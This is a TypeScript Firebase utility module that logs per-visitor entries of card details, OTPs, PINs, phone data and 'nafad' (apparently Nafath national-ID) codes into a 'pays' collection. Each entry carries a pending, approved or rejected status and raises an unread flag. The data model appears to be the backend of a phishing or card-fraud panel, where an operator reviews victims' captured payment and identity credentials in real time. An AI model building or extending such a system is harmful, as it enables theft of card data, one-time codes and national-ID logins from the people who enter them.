import { db } from "./firebase"
import { doc, getDoc, updateDoc } from "firebase/firestore"

export interface HistoryEntry {
  id: string
  type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad"
  timestamp: string
  status: "pending" | "approved" | "rejected"
  data: any
}

/**
 * Add a new entry to visitor's history
 * @param visitorID - The visitor's document ID
 * @param type - Type of the entry (card, otp, pin, etc.)
 * @param data - The data associated with this entry
 * @param status - Initial status (default: "pending")
 */
export async function addToHistory(
  visitorID: string,
  type: HistoryEntry["type"],
  data: any,
  status: HistoryEntry["status"] = "pending"
): Promise<void> {
  try {
    const historyEntry: HistoryEntry = {
      id: `${type}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      type,
      timestamp: new Date().toISOString(),
      status,
      data
    }
    
    // Get current document
    const docRef = doc(db, "pays", visitorID)
    const docSnap = await getDoc(docRef)
    
    if (!docSnap.exists()) {
      console.error(`[history-utils] Document ${visitorID} does not exist`)
      return
    }
    
    const currentHistory = (docSnap.data()?.history || []) as HistoryEntry[]
    
    // Add new entry at the beginning (newest first)
    const updatedHistory = [historyEntry, ...currentHistory]
    
    // Update document
    await updateDoc(docRef, {
      history: updatedHistory,
      updatedAt: new Date(),
      isUnread: true
    })
    
    console.log(`[history-utils] Added ${type} entry to history for ${visitorID}`)
  } catch (error) {
    console.error(`[history-utils] Error adding to history:`, error)
  }
}

/**
 * Update the status of a specific history entry
 * @param visitorID - The visitor's document ID
 * @param historyId - The ID of the history entry to update
 * @param newStatus - The new status
 */
export async function updateHistoryStatus(
  visitorID: string,
  historyId: string,
  newStatus: HistoryEntry["status"]
): Promise<void> {
  try {
    const docRef = doc(db, "pays", visitorID)
    const docSnap = await getDoc(docRef)
    
    if (!docSnap.exists()) {
      console.error(`[history-utils] Document ${visitorID} does not exist`)
      return
    }
    
    const history = (docSnap.data()?.history || []) as HistoryEntry[]
    
    const updatedHistory = history.map((entry) => {
      if (entry.id === historyId) {
        return { ...entry, status: newStatus }
      }
      return entry
    })
    
    await updateDoc(docRef, {
      history: updatedHistory,
      updatedAt: new Date(),
      isUnread: true
    })
    
    console.log(`[history-utils] Updated history entry ${historyId} to ${newStatus}`)
  } catch (error) {
    console.error(`[history-utils] Error updating history status:`, error)
  }
}

/**
 * Get the latest entry of a specific type
 * @param history - The history array
 * @param type - The type to filter by
 */
export function getLatestEntry(
  history: HistoryEntry[],
  type: HistoryEntry["type"]
): HistoryEntry | null {
  const filtered = history.filter((entry) => entry.type === type)
  return filtered.length > 0 ? filtered[0] : null
}

/**
 * Get all entries of a specific type
 * @param history - The history array
 * @param type - The type to filter by
 */
export function getEntriesByType(
  history: HistoryEntry[],
  type: HistoryEntry["type"]
): HistoryEntry[] {
  return history.filter((entry) => entry.type === type)
}
